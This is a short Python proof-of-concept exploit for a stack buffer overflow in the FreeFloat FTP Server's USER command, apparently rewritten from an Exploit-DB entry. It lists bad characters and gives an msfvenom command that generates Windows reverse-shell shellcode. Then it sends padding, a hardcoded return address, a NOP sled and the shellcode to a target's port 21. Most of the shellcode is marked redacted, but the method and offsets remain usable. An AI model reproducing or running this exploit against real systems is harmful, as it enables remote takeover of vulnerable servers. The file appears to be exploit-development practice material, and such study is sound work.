# vanilla stack bof; freefloat ftp server 'USER' remote buffer overflow https://www.exploit-db.com/exploits/23243
# simple PoC rewrite by size_t

#!/usr/bin/python
import socket
import sys

#badchars: ‘\x00\x0A\x0D’
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f py –e x86/shikata_ga_nai -b "\x00\x0A\x0D"
buf =  b""
buf += b"\xdb\xdf\xbf\xab\x1d\x1b\x45\xd9\x74\x24\xf4\x58\x31"
#...shellcode redacted....


eip = "\x90\x06\xbe\x75"
nops = "\x90" * 10
buffer = "A" * 230

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connect = s.connect(('192.168.62.5', 21)) #change to target ip and port
s.recv(1024)
s.send('USER '+ buffer + eip + nops + buf + '\r\n')
